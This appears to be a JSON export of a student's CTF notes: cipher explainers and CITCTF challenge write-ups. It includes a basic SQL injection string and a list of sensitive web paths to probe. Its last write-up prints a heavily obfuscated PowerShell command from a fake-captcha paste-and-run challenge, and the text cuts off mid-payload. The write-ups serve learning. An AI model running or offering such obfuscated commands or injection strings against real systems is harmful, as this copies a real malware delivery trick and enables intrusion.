{"CTF/Bin-Exp/Binary-Exploitation":{"slug":"CTF/Bin-Exp/Binary-Exploitation","filePath":"CTF/Bin Exp/Binary Exploitation.md","title":"Binary Exploitation","links":[],"tags":[],"content":""},"CTF/CTF":{"slug":"CTF/CTF","filePath":"CTF/CTF.md","title":"CTF","links":["CTF/Bin-Exp/Binary-Exploitation","CTF/Cryptography/Cryptography","CTF/Forensics/Forensics","CTF/Osint/Open-Source-Intelligence","CTF/Rev/Reverse-Engineering","CTF/Web-Exp/Web-Exploitation","CTF/Misc/Miscellaneous","CTF/CTFS/ISSESSIONS-CTF"],"tags":[],"content":"Categories\nBinary Exploitation\nCryptography\nForensics\nOpen Source Intelligence\nReverse Engineering\nWeb Exploitation\nMiscellaneous\nCTFs\nISSESSIONS CTF"},"CTF/CTFS/ISSESSIONS-CTF":{"slug":"CTF/CTFS/ISSESSIONS-CTF","filePath":"CTF/CTFS/ISSESSIONS CTF.md","title":"ISSESSIONS CTF","links":[],"tags":[],"content":""},"CTF/CTFS/MagpieCTF":{"slug":"CTF/CTFS/MagpieCTF","filePath":"CTF/CTFS/MagpieCTF.md","title":"MagpieCTF","links":[],"tags":[],"content":""},"CTF/CTFS/PicoCTF":{"slug":"CTF/CTFS/PicoCTF","filePath":"CTF/CTFS/PicoCTF.md","title":"PicoCTF","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Atbash":{"slug":"CTF/Cryptography/Ciphers/Atbash","filePath":"CTF/Cryptography/Ciphers/Atbash.md","title":"Atbash","links":[],"tags":[],"content":"Tools:\nwww.dcode.fr/atbash-cipher\nVery simple cipher, it just reverses the order of the alphabet so to say.\nSo:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nABCDEFGHIJKLMZYXWVUTSRQPONNOPQRSTUVWXYZMLKJIHGFEDCBA\nSo to encrypt ‘Man’\nM - N\na - Z\nn - M\nSo ‘Man’ = ‘NZM’\nNote: Atbash doesn’t notice casing, all letters are treated as capitals"},"CTF/Cryptography/Ciphers/BCrypt":{"slug":"CTF/Cryptography/Ciphers/BCrypt","filePath":"CTF/Cryptography/Ciphers/BCrypt.md","title":"BCrypt","links":["tags/Hashing","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nBlowfish\nTools:\ngchq.github.io/CyberChef/#recipe=Bcrypt(10)\nwww.devglan.com/online-tools/bcrypt-hash-generator\nwww.dcode.fr/crypt-hashing-function\nNote: There is no easy way of decoding a BCrypt Cipher\nOf those tools above, I’m not sure if any could actually break\na fully secure BCrypt\n\nen.wikipedia.org/wiki/Bcrypt ^\nIt is far too complicated for me to explain in this, just look at the wiki"},"CTF/Cryptography/Ciphers/Base32":{"slug":"CTF/Cryptography/Ciphers/Base32","filePath":"CTF/Cryptography/Ciphers/Base32.md","title":"Base32","links":["tags/Base"],"tags":["Base"],"content":"Base\nTools:\nwww.dcode.fr/base-32-encoding\ngchq.github.io/CyberChef/\ncryptii.com/pipes/base32 especially good for the different variants of Base32\nBase32 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nOr it uses:\n\nOr it uses:\n\nOr it uses:\n\nNote they also have ’=’ as an index 32 of sorts\n= Is a padding character that doesn’t change the meaning\nThe most common alphabet is RFC 4648\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen separating those into sets of 5 bits:\n01001 - 9\n10101 - 21\n10000 - 16\n10110 - 22\n1110 - NAN\nbut instead of giving an error, you add ones until you get full set, then append an = at the end:\n11100 - 28\n\n=\nThen putting that from ASCII into the Base32 alphabet\n\n9 - J\n21 - V\n16 - Q\n22 - W\n28 - 4\n= - =\nSo the encrypted text would be:\n‘Man’ = JVQW4="},"CTF/Cryptography/Ciphers/Base64":{"slug":"CTF/Cryptography/Ciphers/Base64","filePath":"CTF/Cryptography/Ciphers/Base64.md","title":"Base64","links":["tags/Base","CTF/CTFS/ISSESSIONS-CTF"],"tags":["Base"],"content":"Base\nTools:\nwww.base64decode.org/\nwww.dcode.fr/base-64-encoding\ngchq.github.io/CyberChef/\nBase64 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nThere are two versions that have a different 62/63rd character\n\nNote the standard Base64 also has ’=’ as an index 64 of sorts\n= Is a padding character that doesn’t change the meaning\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen, by separating that into sets of 6 bits you get\n010011 - 19\n010110 - 22\n000101 - 5\n101110 - 46\nIn the table above. in Base64 those translate to:\n19 - T\n22 - W\n5 - F\n46 - u\nSo, ‘Man’ using Base64 translates to ‘TWFu’\nIf for example, you only had ‘Ma’\nIn ASCII, it would be\nM-77\na-91\nin binary:\n77 - 01001101\n91 - 01100001\nIn sets of 6 bits:\n010011 - 19\n010110 - 22\n0001 -NAN\nBut instead of raising an error, it then appends 0’s til you have a set of 6 bits, and appends an ’=’ at the end of the string\nso 0001 becomes\n000100 - 4\nAnd:\n19 - T\n22 - W\n4 - E\nAppended =\nSo ‘Ma’ translates into ‘TWE=’\nAn example of a challenge where this is useful is:\nISSESSIONS CTF Easy Key 4\nYou’ve intercepted a base64 password and its right here : YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4. Yogur task is to unlock the true fla. In puzzles like this, balance is key. Maybe this string equals the flag if something is added. But you must be careful since too many cooks spoil the broth. You must change the recipe without changing the taste. Can this even be done? It may be possible to change the password without changing the meaning.\nYou also got this weird one. I don’t know what they are. It could be helpful since it looks like base64.\nCoCwpgBAZgNghgcwgSwM4QC7gE5gDQQCeA9gK4QhwBukyGmOYAdC00A==\nrZjetu8D7gfy4QnZAJGRMGwb5tBLUBcvUvkY3LEK2dxjVzNE6kT1ou09Un1mEVqN5jR===\n=\nYruDaoDF4AWD5MbtsDi=====\nThe solution to this was to take YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 and add ===\nSo the final key was bhbureauCTF{YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 === } as adding the ’=’ doesn’t change the decoded text at all."},"CTF/Cryptography/Ciphers/Block-Transposition-Cipher":{"slug":"CTF/Cryptography/Ciphers/Block-Transposition-Cipher","filePath":"CTF/Cryptography/Ciphers/Block Transposition Cipher.md","title":"Block Transposition Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Blowfish":{"slug":"CTF/Cryptography/Ciphers/Blowfish","filePath":"CTF/Cryptography/Ciphers/Blowfish.md","title":"Blowfish","links":["tags/Hashing","CTF/Cryptography/Ciphers/BCrypt"],"tags":["Hashing"],"content":"Hashing\nBCrypt"},"CTF/Cryptography/Ciphers/CSR-Certificate":{"slug":"CTF/Cryptography/Ciphers/CSR-Certificate","filePath":"CTF/Cryptography/Ciphers/CSR Certificate.md","title":"CSR Certificate","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Caesar-Cipher":{"slug":"CTF/Cryptography/Ciphers/Caesar-Cipher","filePath":"CTF/Cryptography/Ciphers/Caesar Cipher.md","title":"Caesar Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Hashing":{"slug":"CTF/Cryptography/Ciphers/Hashing","filePath":"CTF/Cryptography/Ciphers/Hashing.md","title":"Hashing","links":["tags/Hashing","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nMD5\nBCrypt\nSHA1\nSHA256\nSHA512\nBlowfish"},"CTF/Cryptography/Ciphers/Hexadecimal":{"slug":"CTF/Cryptography/Ciphers/Hexadecimal","filePath":"CTF/Cryptography/Ciphers/Hexadecimal.md","title":"Hexadecimal","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Leet-Speak":{"slug":"CTF/Cryptography/Ciphers/Leet-Speak","filePath":"CTF/Cryptography/Ciphers/Leet Speak.md","title":"Leet Speak","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/MD5":{"slug":"CTF/Cryptography/Ciphers/MD5","filePath":"CTF/Cryptography/Ciphers/MD5.md","title":"MD5","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Mod-and-Match":{"slug":"CTF/Cryptography/Ciphers/Mod-and-Match","filePath":"CTF/Cryptography/Ciphers/Mod and Match.md","title":"Mod and Match","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Morse-Code":{"slug":"CTF/Cryptography/Ciphers/Morse-Code","filePath":"CTF/Cryptography/Ciphers/Morse Code.md","title":"Morse Code","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/RSA-Cipher":{"slug":"CTF/Cryptography/Ciphers/RSA-Cipher","filePath":"CTF/Cryptography/Ciphers/RSA Cipher.md","title":"RSA Cipher","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nimp3rf3ct:\ninverse-converse\nall-ends-same\ngrey-area"},"CTF/Cryptography/Ciphers/Rail-Fence-Cipher":{"slug":"CTF/Cryptography/Ciphers/Rail-Fence-Cipher","filePath":"CTF/Cryptography/Ciphers/Rail Fence Cipher.md","title":"Rail Fence Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA1":{"slug":"CTF/Cryptography/Ciphers/SHA1","filePath":"CTF/Cryptography/Ciphers/SHA1.md","title":"SHA1","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA256":{"slug":"CTF/Cryptography/Ciphers/SHA256","filePath":"CTF/Cryptography/Ciphers/SHA256.md","title":"SHA256","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA512":{"slug":"CTF/Cryptography/Ciphers/SHA512","filePath":"CTF/Cryptography/Ciphers/SHA512.md","title":"SHA512","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Steganography":{"slug":"CTF/Cryptography/Ciphers/Steganography","filePath":"CTF/Cryptography/Ciphers/Steganography.md","title":"Steganography","links":["CTF/CTFS/MagpieCTF","CTF/Web-Exp/Web-Exploitation"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nHelmet:\nWeb Exploitation"},"CTF/Cryptography/Ciphers/Substitution-Cipher":{"slug":"CTF/Cryptography/Ciphers/Substitution-Cipher","filePath":"CTF/Cryptography/Ciphers/Substitution Cipher.md","title":"Substitution Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Vigenere-Cipher":{"slug":"CTF/Cryptography/Ciphers/Vigenere-Cipher","filePath":"CTF/Cryptography/Ciphers/Vigenere Cipher.md","title":"Vigenere Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Whitespace-Cipher":{"slug":"CTF/Cryptography/Ciphers/Whitespace-Cipher","filePath":"CTF/Cryptography/Ciphers/Whitespace Cipher.md","title":"Whitespace Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/XOR-Cipher":{"slug":"CTF/Cryptography/Ciphers/XOR-Cipher","filePath":"CTF/Cryptography/Ciphers/XOR Cipher.md","title":"XOR Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Cryptography":{"slug":"CTF/Cryptography/Cryptography","filePath":"CTF/Cryptography/Cryptography.md","title":"Cryptography","links":["CTF/CTF","CTF/Cryptography/Ciphers/Base64","CTF/Cryptography/Ciphers/Base32","CTF/Cryptography/Ciphers/Vigenere-Cipher","CTF/Cryptography/Ciphers/Caesar-Cipher","CTF/Cryptography/Ciphers/CSR-Certificate","CTF/Cryptography/Ciphers/Substitution-Cipher","CTF/Cryptography/Ciphers/Rail-Fence-Cipher","CTF/Cryptography/Ciphers/Block-Transposition-Cipher","CTF/Cryptography/Ciphers/Steganography","CTF/Cryptography/Ciphers/Mod-and-Match","CTF/Cryptography/Ciphers/RSA-Cipher","CTF/Cryptography/Ciphers/Morse-Code","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/Whitespace-Cipher","CTF/Cryptography/Ciphers/Hexadecimal","CTF/Cryptography/Ciphers/XOR-Cipher","CTF/Cryptography/Ciphers/Atbash","CTF/Cryptography/Ciphers/Leet-Speak","CTF/Cryptography/Ciphers/Blowfish"],"tags":[],"content":"CTF\nCryptography is used to denote the subset of challenges that require decoding/encrypting certain text in order to get another answer/flag\nOne of the best tools for identifying which cipher to use for the encrypted text is:\nwww.dcode.fr/cipher-identifier\nCiphers\nBase64\nBase32\nVigenere Cipher\nCaesar Cipher\nCSR Certificate\nSubstitution Cipher\nRail Fence Cipher\nBlock Transposition Cipher\nSteganography\nMod and Match\nRSA Cipher\nMorse Code\nSHA1\nSHA256\nSHA512\nMD5\nBCrypt\nWhitespace Cipher\nHexadecimal\nXOR Cipher\nAtbash\nLeet Speak\nBlowfish"},"CTF/Forensics/Forensics":{"slug":"CTF/Forensics/Forensics","filePath":"CTF/Forensics/Forensics.md","title":"Forensics","links":[],"tags":[],"content":""},"CTF/Misc/Miscellaneous":{"slug":"CTF/Misc/Miscellaneous","filePath":"CTF/Misc/Miscellaneous.md","title":"Miscellaneous","links":[],"tags":[],"content":""},"CTF/Osint/Open-Source-Intelligence":{"slug":"CTF/Osint/Open-Source-Intelligence","filePath":"CTF/Osint/Open Source Intelligence.md","title":"Open Source Intelligence","links":[],"tags":[],"content":""},"CTF/Pwn/Pwn":{"slug":"CTF/Pwn/Pwn","filePath":"CTF/Pwn/Pwn.md","title":"Pwn","links":[],"tags":[],"content":""},"CTF/Rev/Reverse-Engineering":{"slug":"CTF/Rev/Reverse-Engineering","filePath":"CTF/Rev/Reverse Engineering.md","title":"Reverse Engineering","links":[],"tags":[],"content":""},"CTF/Web-Exp/Browser-Edit":{"slug":"CTF/Web-Exp/Browser-Edit","filePath":"CTF/Web Exp/Browser Edit.md","title":"Browser Edit","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nInspect element,\nin the three dots at the top right click more tools\nThen click network conditions\nThen scroll down and change user from\n“custom browser” to the desired browser"},"CTF/Web-Exp/Common-http-add-ons":{"slug":"CTF/Web-Exp/Common-http-add-ons","filePath":"CTF/Web Exp/Common http add-ons.md","title":"Common http add-ons","links":["CTF/CTFS/MagpieCTF","CTF/CTFS/PicoCTF"],"tags":[],"content":"MagpieCTF   PicoCTF\n/robots.txt\n/login\n/admin\n/.htaccess\n/.DS_Store"},"CTF/Web-Exp/Cookie-Bypass":{"slug":"CTF/Web-Exp/Cookie-Bypass","filePath":"CTF/Web Exp/Cookie Bypass.md","title":"Cookie Bypass","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF"},"CTF/Web-Exp/SQL-injection":{"slug":"CTF/Web-Exp/SQL-injection","filePath":"CTF/Web Exp/SQL injection.md","title":"SQL injection","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nBasic SQL injection:\n’ OR 1=1—"},"CTF/Web-Exp/Web-Exploitation":{"slug":"CTF/Web-Exp/Web-Exploitation","filePath":"CTF/Web Exp/Web Exploitation.md","title":"Web Exploitation","links":["tags/ctf"],"tags":["ctf"],"content":"ctf"},"WRITEUPS/CITCTF/Ask-Nicely":{"slug":"WRITEUPS/CITCTF/Ask-Nicely","filePath":"WRITEUPS/CITCTF/Ask Nicely.md","title":"Ask Nicely","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nAsk Nicely\nForensics\nWorth 668 Points\nBy ronnie\n\nI made this program, you just have to ask really nicely for the flag!\nAnd attached is a file ‘asknicely’.\nSolution\nWhen you run asknicely it asks:\nexample% ./asknicely\nHow badly do you want the flag?\nNo matter how you respond it then says:\nAsk nicely...\nThen if you respond incorrectly it says:\nthat&#039;s not quite what I&#039;m lookng for.\nSo it’s clear that we need to find the right input/phrase that it’s looking for.\nSo I then disassembled the code and got the following:\n\n\n\nAfter looking through it, I noticed that after it tells me to ‘Ask nicely…’ it will either output “Good job, I’m so proud of you!” or “that’s not quite what I’m looking for”.\nAnd in the aGoodJobIMSoPro side you can also see:\ncall    _Z9give_flagNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; give_flag(std::string)\nSo it’s safe to assume that by getting the aGoodJobIMSoPro option it will output the flag\nBut we still need to find out the right input.\nSo if you look through fastcall main, you’ll notice a line that stands out:\nlea     rdx, aPrettyPrettyPr ; &quot;pretty pretty pretty pretty pretty plea&quot;...\nwhich seems like the Ask Nicely phrase we’re looking for\nSo if you dig a little deeper you get:\n.rodata:0000000000576030 aPrettyPrettyPr db &#039;pretty pretty pretty pretty pretty please with sprinkles and a ch&#039;\nwhich is close but not complete, so if you use shift+f12 in IDA to view the strings you’ll find:\n\nwhich seems like the right phrase, ‘pretty pretty pretty pretty pretty please with sprinkles and a cherry on top’.\nFlag\nSo if you run the asknicely program with the right inputs:\nexample% ./asknicely How badly do you want the flag?\nThis input doesn&#039;t matter Ask nicely…\n`pretty pretty pretty pretty pretty please with sprinkles and a cherry on top\nIt outputs:\n`Good job, I’m so proud of you!\nAnd it outputs the correct flag: CIT{2G20kX09yF3F}"},"WRITEUPS/CITCTF/Blank-Image":{"slug":"WRITEUPS/CITCTF/Blank-Image","filePath":"WRITEUPS/CITCTF/Blank Image.md","title":"Blank Image","links":["CTF/Cryptography/Ciphers/Steganography"],"tags":[],"content":"Steganography\nDescription\nBlank Image\nSteganography\nWorth 589 Points\nBy ronnie\n\nI was gonna make a really cool challenge but then I literally forgot about it so all I have is this blank image. Good luck!\nAnd attached is a completely blank image:\n\nSolution\nBy putting the blank image into Aperisolve.com you’re able to use it’s ZSteg function and you’re able to find that of the 8x17 pixels some of them have alpha = 0 or alpha = 1 in the alpha channel. Taking those and interpreting it as binary gives\n01000011 01001001 01010100 01111011 01101110 00110001 01000110 00110000 01010010 01110011 01101101 00110000 01000101 01110010 00110100 00110000 01111101\nFlag\nWhen you decrypt the binary into text you get the correct flag:\nCIT{n1F0Rsm0Er40}"},"WRITEUPS/CITCTF/Brainrot-Quiz!":{"slug":"WRITEUPS/CITCTF/Brainrot-Quiz!","filePath":"WRITEUPS/CITCTF/Brainrot Quiz!.md","title":"Brainrot Quiz!","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nBrainrot Quiz!\nForensics\nWorth 480 Points\nBy boom\n\nBombardiro Crocodillo or…? You find out…\nSHA256: e5f5d4e97506233266904e460fdfea4fc3ce2bf1542dc122283835c545fb8516\nThen there’s an attached pcap file\n\nSolution\nAfter looking through each of the Echo (ping) requests and replies only 1 stands out as odd, number 11.\nIn number eleven it shows:\n\nAnd in the hexadecimal/ASCII you’ll find Q0lUe3RyNGw0bDNyMF90cjRsNGw0fQ== which looks exactly like base64 code.\nFlag\nAnd decrypting Q0lUe3RyNGw0bDNyMF90cjRsNGw0fQ== through base64 gives the correct flag:\nCIT{tr4l4l3r0_tr4l4l4}"},"WRITEUPS/CITCTF/Calculator":{"slug":"WRITEUPS/CITCTF/Calculator","filePath":"WRITEUPS/CITCTF/Calculator.md","title":"Calculator","links":["CTF/Misc/Miscellaneous","calculator-(1)-1.lua"],"tags":[],"content":"Miscellaneous\nDescription\nCalculator\nMisc\nWorth 777 Points\nBy ronnie\n\nFind the flag.\nFlag Format: CIT{example_flag}\nThen there’s an attached calculator.lua file which contains\nfunction calculate(num1,num2,operator)\n\n    if operator == &quot;+&quot; then\n\n        return num1 + num2\n\n    elseif operator == &quot;-&quot; then\n\n        return num1 - num2\n\n    elseif operator == &quot;*&quot; then\n\n        return num1 * num2\n\n    elseif operator == &quot;/&quot; then\n\n        if num2 == 0 then\n\n            return &quot;Error: Division by zero is not allowed.&quot;\n\n        else\n\n            return num1 / num2\n\n        end\n\n    else\n\n        return &quot;Error: Invalid operator.&quot;\n\n    end\n\nend\n\n  \n\nio.write(&quot;Enter the first number: &quot;)\n\nlocal input1 = io.read()\n\nlocal number1 = tonumber(input1)\n\nif not number1 then\n\n    print(&quot;Invalid input. Please enter a valid number.&quot;)\n\n    os.exit(1)\n\nend\n\n  \n\nio.write(&quot;Enter an operator (+, -, *, /): &quot;)\n\nlocal operator = io.read()\n\n  \n\nio.write(&quot;Enter the second number: &quot;)\n\nlocal input2 = io.read()\n\nlocal number2 = tonumber(input2)\n\nif not number2 then\n\n    print(&quot;Invalid input. Please enter a valid number.&quot;)\n\n    os.exit(1)\n\nend\n\n  \n\nlocal result = calculate(number1, number2, operator)\n\n  \n\nprint(&quot;Result: &quot; .. tostring(result))\n\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n\n  \n  \n  \n  \n\n-- nope no flag here, keep looking :P\n\nTransclude of calculator-(1)-1.lua\nSolution\nAfter looking through the file I found it suspicious that there were 70 or so extra lines, so I selected them and noticed that from line 80-114 there were hidden spaces and tabs which immediately reminded of whitespace code.\nFlag\nSo by putting lines 80-114 into www.dcode.fr/whitespace-language you get the correct flag:\nCIT{hft4bT0415Lb}"},"WRITEUPS/CITCTF/I-AM-Steve":{"slug":"WRITEUPS/CITCTF/I-AM-Steve","filePath":"WRITEUPS/CITCTF/I AM Steve.md","title":"I AM Steve","links":["CTF/Cryptography/Ciphers/Steganography"],"tags":[],"content":"Steganography\nDescription\nI AM Steve\nSteganography\nWorth 644 Points\nBy kristine\n\nYou were supposed to be a hero, Brian!\nSHA256: 01b3dbe5d8801adf27a9bb779d85ef4c8881905544642fbdbdd41e54e4d0ae5e\nThen it had the following image attached:\n\nSolution\nBy putting the chicked_jockey image into Aperisolve you’re able to use its Zsteg function to find the hidden text VEhJU19pc19hX2NyYWZ0aW5nX3RhYmxl which looks exactly like base64 encrypted text.-\nFlag\nAnd after decrypting VEhJU19pc19hX2NyYWZ0aW5nX3RhYmxl through base64 and wrapping it with CIT{} you get the correct flag:\nCIT{THIS_is_a_crafting_table}"},"WRITEUPS/CITCTF/Mongolian-throat-singing":{"slug":"WRITEUPS/CITCTF/Mongolian-throat-singing","filePath":"WRITEUPS/CITCTF/Mongolian throat singing.md","title":"Mongolian throat singing","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nMongolian throat singing\nMisc\nWorth 922 Points\nBy boom\n\n\nSend us a clip of you singing your heart out to The Hu for the flag!\nJust kidding, open that terminal and get to work.\nnc 23.179.17.40 5393\nSolution\nAs soon as you run nc 23.179.17.40 5393 in the terminal, you get asked a series of 19 questions:\nTo find the answers I looked online and went by trial and error, especially since in certain questions differences matter (E.g. Goats vs Goat or The battle of mohi vs battle of mohi)\nWhich species of wild goat in Mongolia is famous for its badass horns?\n\t-Markhor\n\t\nWhat is Mongolia&#039;s primary export commodity?\n\t-Coal\n\t\nWhat is the name of the book that Marco Polo wrote about his travels to the Mongol Empire?\n\t-Marco Polo\n\t\nWhich famous Mongol general and grandson of Genghis Khan is known for leading the conquest of the Ilkhanate in Persia?\n\t-Hulagu Khan\n\nIn which year did the Mongol Empire officially split into four khanates?\n\t-1260\n\nIn what year did Mongolia join the World Trade Organization (WTO)?\n\t-1997\n\nWho was the founder of the Mongol Empire?\n\t-Genghis Khan\n\nWhich Mongol leader was known for his conquest of the Song Dynasty in China?\n\t-Kublai Khan\n\nWhich famous Mongol khanate ruled over much of Russia, Ukraine, and parts of Central Asia during the 13th and 14th centuries?\n\t-Golden Horde\n\nWhat is the official currency of Mongolia?\n\t-Tugrug\n\nWhich group do the majority of Kazakhs from South Kazakhstan belong to?\n\t-Senior Zhuz\n\nWhich Mongol leader attempted to invade Japan twice, in 1274 and 1281, but was thwarted by powerful typhoons, known as the &#039;kamikaze&#039; winds?\n\t-Kublai Khan\n\nWhich population migration is responsible for bringing the majority of Y-chromosomal lineages in South Kazakhstan?\n\t-Niru&#039;un mongols\n\nWhat animal is used extensively by Mongolian herders for milk, wool, and meat?\n\t-Yak\n\nWhich famous traveler from Venice visited the Mongol Empire during the reign of Kublai Khan?\n\t-Marco Polo\n\nWhich animal is the primary source of cashmere in Mongolia?\n\t-Goats\n\nWhat is the name of the wild camel species found in Mongolia?\n\t-Bactrian Camels\n\t\nWhat is the second-largest export product of Mongolia after coal?\n\t-Copper\n\nWhat important Mongol battle occurred in 1241 that delayed the Mongol invasion of Europe?\n\t-The battle of mohi\t\n\nFlag\nAfter you get all the questions correct it outputs:\n`you are such a little mongol!! good job\nAnd outputs the correct flag:\nCIT{w0lf_t0t3m}"},"WRITEUPS/CITCTF/Read-Only":{"slug":"WRITEUPS/CITCTF/Read-Only","filePath":"WRITEUPS/CITCTF/Read Only.md","title":"Read Only","links":["CTF/Rev/Reverse-Engineering"],"tags":[],"content":"Reverse Engineering\nDescription\nRead Only\nReverse Engineering\nWorth 534 Points\nBy ronnie\n\nHere we go!\nFlag Format: CIT{example_flag}\nThen attached is a file ‘readonly’\nSolution\nSince the file is called readonly, I suspected that I would find the flag somewhere inside the code, and not by running it.\nSo when I disassemble the code I get:\n\nThen I decided to click into each of the programs\nFlag\nAnd by clicking into sub_407C05\n\nWe get the correct flag:\nCIT{87z1BjG1968G}"},"WRITEUPS/CITCTF/Rotten":{"slug":"WRITEUPS/CITCTF/Rotten","filePath":"WRITEUPS/CITCTF/Rotten.md","title":"Rotten","links":["CTF/Cryptography/Cryptography"],"tags":[],"content":"Cryptography\nDescription\nRotten\nCryptography\nWorth 304 Points\nBy ronnie\n\nPVG{LxxdJwAXJGcsDoncKfRctddA}\nFlag Format: CIT{example_flag}\nSolution\nAfter looking at PVG{LxxdJwAXJGcsDoncKfRctddA} it seems fairly obvious that this is a Caesar cipher\nFlag\nAnd after you put it through Rot13 you get the correct flag:\nCIT{YkkqWjNKWTpfQbapXsEpgqqN}"},"WRITEUPS/CITCTF/Select-all-squares-that-contain-uhh...":{"slug":"WRITEUPS/CITCTF/Select-all-squares-that-contain-uhh...","filePath":"WRITEUPS/CITCTF/Select all squares that contain uhh....md","title":"Select all squares that contain uhh...","links":["CTF/Misc/Miscellaneous"],"tags":[],"content":"Miscellaneous\nDescription\nSelect all squares that contain uhh...\nMisc\nWorth 819 Points\nBy boom\n\nThese captchas seem to get more difficult day by day…\n\nIf the challenge site does not seem to load at first, please try it through a private window or another browser before contacting CTF support\n\ncaptcha.cyber-cit.club/\nSolution\nOnce you go to the website you’ll find:\n\nThen by following the instructions you open powershell.exe\nand get this pop-up:\n\nAnd when you past into powershell you get:\nsEt-varIabLE IqBofD (  &quot;  ) )43]rAhC[,)18]rAhC[+77]rAhC[+28]rAhC[(eCaLpeRc-93]rAhC[,&#039;ukz&#039;eCaLpeRc- 63]rAhC[,&#039;akF&#039;eCaLpeRc-)&#039;) uk&#039;+&#039;zukz&#039;+&#039;NIoJ-]) hTGNEl.jQZakF ( -.. 1 -&#039;+&#039;[jQZakF ()ukzxukz+&#039;+&#039;]03[EmoHsPakF+]4[eMohspakF (. ; )  QMR iex( (ukz &amp; ( r&#039;+&#039;A9SHeLLiD&#039;+&#039;[1]+rA9sheLLId[13]+IiDXIiD)( (u&#039;+&#039;kz+ukz((lbH{15}{11}{10}{1}ukz+ukz{22}{35}{24}{21ukz+&#039;+&#039;ukz}{4}{34}{8}{9}{16}{27}{5}{38}{33}{23}{14}{20}{6}{26}{13}{17}{7}{28}{ukz+ukz37}{31}{29}{2}{32}{ukz+ukz1&#039;+&#039;2ukz+ukz}{36}{0}ukz+ukz{19}{3}{18}{25}{30}lbH-fIiDriDmoIiD,IiD3]RahC[,yzpC1HyzpeCAlp&#039;+&#039;eukz+ukzr-93]Rah&#039;+&#039;C[,IiD,IiD]diug[(yzIiD,IiD((( )yzpxyzp+]43[EMohSPA&#039;+&#039;ROIiD,IiDhC[IiD,IiDzpos si gayzp+yzIiD,IiDukz+ukzyzpnlQsnyzp+yz&#039;+&#039;plyzp+yzpQukz+ukzsyzp+yzpPyzp+yzp81 tsoH-eukz+ukztiyzp+yzprW ;Pyzp+yzp81yzp+yukz+ukzzp}yryzp+yzpr0wukz+ukz_tn&#039;+&#039;0d_3r4yzp+&#039;+&#039;yzpwl4m_t&#039;+&#039;n1yzp+yzpa_s1htIiD,IiDyyzukz+ukzp+yzpr&#039;+&#039;otceriD&#039;+&#039; eyzp+yzppy&#039;+&#039;Tmyzukz+u&#039;+&#039;kzp+yzpetyzp&#039;+&#039;+&#039;+&#039;yzpI- riDyzp+yzpIiD,IiD[(eCAlper-)yzpukz+ukzP81!ti ukz+ukzd&#039;+&#039;IiD,IiDyzp+yzpnifyzp+yzukz+ukzp ogyzIiD,IiD )6I&#039;+&#039;iD,Iiukz+ukz&#039;+&#039;DIABLE &#039;+&#039;n7A1u (ask )IiD,IiDzp+yzpaPdlihC- yzp+ukz+ukzyzpPMET:vneIiDukz+ukz,IiDP81ukz+ukztyzp+yzpxt.galfP8yzp+yzp1 yzp+yzphtyzp+yzpaPdlihukz+ukzC- 